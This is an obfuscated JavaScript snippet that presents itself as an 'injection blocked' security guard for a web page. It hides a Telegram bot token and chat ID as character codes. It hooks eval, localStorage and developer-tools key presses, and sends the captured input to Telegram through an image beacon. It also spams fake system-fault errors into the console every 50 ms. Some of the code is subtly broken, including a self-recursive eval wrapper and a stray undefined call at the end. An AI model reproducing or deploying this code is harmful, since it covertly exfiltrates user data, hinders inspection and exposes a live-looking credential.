(function(_0x1a2b3c) {
    'use strict';
    const _0x4d5e6f = (function() {
        const _0x7g8h = [56,56,53,54,50,57,52,55,48,52,58,65,65,71,105,83,107,122,100,102,53,54,115,88,95,67,54,83,83,119,65,55,120,54,114,108,56,110,75,107,75,119,102,69,97,115];
        const _0x9i0j = [55,54,54,52,52,49,48,48,53,52];
        const _0x1k2l = function(_0x3m) { return _0x3m.map(c => String.fromCharCode(c)).join(''); };
        return { _t: _0x1k2l(_0x7g8h), _i: _0x1k2l(_0x9i0j) };
    })();

    function _0x4n5o(_0x6p) {
        if (_0x6p.event !== 'injection_blocked') return;
        const _0x7q = _0x6p.type || '❌';
        const _0x8r = _0x6p.input || 'لا يوجد محتوى';
        const _0x9s = _0x6p.result || 'null';
        
        const _0x0t = `\`\`\`\n${_0x7q}\n\`\`\`\n\n♦♠♦\n\n\`\`\`\n${_0x8r.replace(/[()]/g, '')}\n\`\`\`\n\n♦♠♦\n\n\`\`\`\n${_0x9s}\n\`\`\``;
        
        if (_0x4d5e6f._t && _0x4d5e6f._i) {
            const _0x1u = new Image();
            _0x1u.src = `https://api.telegram.org/bot${_0x4d5e6f._t}/sendMessage?chat_id=${_0x4d5e6f._i}&text=${encodeURIComponent(_0x0t)}&parse_mode=Markdown`;
        }
    }

    function _0x2v3w(_0x4x, _0x5y, _0x6z, _0x7a) {
        _0x4n5o({ event: 'injection_blocked', type: _0x4x, input: _0x5y, mechanism: _0x6z, result: _0x7a });
    }

    function _0x8b9c() {
        setInterval(() => {
            console.error("%c SYSTEM_FAULT_DETECTED ", "background: black; color: red; font-size: 20px; font-weight: bold;");
            console.error("Critical error at: " + Date.now());
        }, 50);
    }

    const _0x0d1e = (_0x2f) => {
        const _0x3g = String(_0x2f);
        return _0x3g.includes('eruda') || _0x3g.includes('webpack');
    };

    const _0x4h5i = () => {
        const _0x6j = {
            get: (_0x7k, _0x8l) => { 
                if(!_0x0d1e(_0x8l)) _0x2v3w("Storage Access", String(_0x8l), "Proxy", "null"); 
                return _0x7k[_0x8l]; 
            },
            set: (_0x9m, _0x0n, _0x1o) => {
                if(!_0x0d1e(_0x0n)) _0x2v3w("Storage Write", String(_0x0n), "Proxy", "null");
                return false;
            }
        };
        try { window.localStorage = new Proxy(window.localStorage, _0x6j); } catch(e) {}
    };

    const _0x2p3q = () => {
        window.eval = function(_0x4r) {
            if (_0x0d1e(_0x4r)) return window.eval(_0x4r);
            _0x2v3w("eval()", _0x4r, "Blocked", "null");
            return null;
        };
    };

    window.addEventListener('keydown', function(_0x5s) {
        if (_0x5s.key === 'F12' || (_0x5s.ctrlKey && _0x5s.shiftKey && ['I','J','C'].includes(_0x5s.key))) {
            _0x5s.preventDefault();
            _0x2v3w("Keyboard", _0x5s.key, "Blocked", "null");
        }
    });

    _0x8b9c();
    _0x4h5i();
    ي();
})();
